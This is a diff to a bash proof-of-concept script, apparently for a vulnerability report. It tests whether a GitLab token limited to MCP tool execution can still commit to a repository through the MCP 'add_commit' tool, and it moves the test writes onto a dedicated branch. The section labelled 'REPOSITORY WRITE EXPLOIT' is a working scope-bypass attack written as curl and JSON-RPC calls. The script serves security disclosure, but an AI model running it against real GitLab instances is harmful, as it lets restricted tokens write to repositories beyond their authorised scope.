@@ -82,6 +82,12 @@ if [[ "$SEED_OK" != true ]]; then
   exit 26
 fi
 
+echo "===== create unprotected write target branch ====="
+WRITE_BRANCH="h1-write-target"
+api "$ROOT_TOKEN" POST "/projects/$PROJECT_ID/repository/branches" \
+  --data-urlencode "branch=$WRITE_BRANCH" \
+  --data-urlencode "ref=main" >"$OUT/write-branch.json"
+
 echo "===== create GPAT with ONLY execute_mcp_tool on user boundary ====="
 docker cp security/gitlab-mcp-gpat/create_gpat.rb "$CONTAINER:/tmp/h1-create-mcp-gpat.rb"
 echo "gpat-create:start"
@@ -158,7 +164,7 @@ DIRECT_WRITE_BODY="$OUT/direct-repo-write-body.json"
 DIRECT_WRITE_STATUS="$(curl -sS -o "$DIRECT_WRITE_BODY" -w '%{http_code}' \
   --request POST \
   --header "PRIVATE-TOKEN: $GPAT" \
-  --data-urlencode "branch=main" \
+  --data-urlencode "branch=$WRITE_BRANCH" \
   --data-urlencode "commit_message=Direct GPAT write control" \
   --data-urlencode "content=$REPO_WRITE_VALUE" \
   "$BASE/api/v4/projects/$PROJECT_ID/repository/files/h1-direct-write-control.txt")"
@@ -169,7 +175,7 @@ if [[ "$DIRECT_WRITE_STATUS" == "201" ]]; then
 fi
 
 echo "===== REPOSITORY WRITE EXPLOIT: same MCP-only GPAT calls add_commit ====="
-MCP_COMMIT_BODY="$(jq -cn --arg p "$PROJECT_PATH" --arg content "$REPO_WRITE_VALUE" '{
+MCP_COMMIT_BODY="$(jq -cn --arg p "$PROJECT_PATH" --arg branch "$WRITE_BRANCH" --arg content "$REPO_WRITE_VALUE" '{
   jsonrpc:"2.0",
   id:"h1-commit",
   method:"tools/call",
@@ -177,7 +183,7 @@ MCP_COMMIT_BODY="$(jq -cn --arg p "$PROJECT_PATH" --arg content "$REPO_WRITE_VAL
     name:"add_commit",
     arguments:{
       project_id:$p,
-      branch:"main",
+      branch:$branch,
       commit_message:"H1 MCP granular PAT repository write proof",
       actions:[{action:"create",file_path:"h1-mcp-write-proof.txt",content:$content}]
     }
@@ -191,7 +197,7 @@ printf '%s\n' "$MCP_COMMIT" | tee "$OUT/mcp-add-commit.json"
 VERIFY_WRITE_BODY="$OUT/mcp-write-verify.txt"
 VERIFY_WRITE_STATUS="$(curl -sS -o "$VERIFY_WRITE_BODY" -w '%{http_code}' \
   -H "PRIVATE-TOKEN: $ROOT_TOKEN" \
-  "$BASE/api/v4/projects/$PROJECT_ID/repository/files/h1-mcp-write-proof.txt/raw?ref=main")"
+  "$BASE/api/v4/projects/$PROJECT_ID/repository/files/h1-mcp-write-proof.txt/raw?ref=$WRITE_BRANCH")"
 MCP_COMMIT_MATCH=false
 if [[ "$VERIFY_WRITE_STATUS" == "200" ]] && grep -Fqx "$REPO_WRITE_VALUE" "$VERIFY_WRITE_BODY"; then
   MCP_COMMIT_MATCH=true
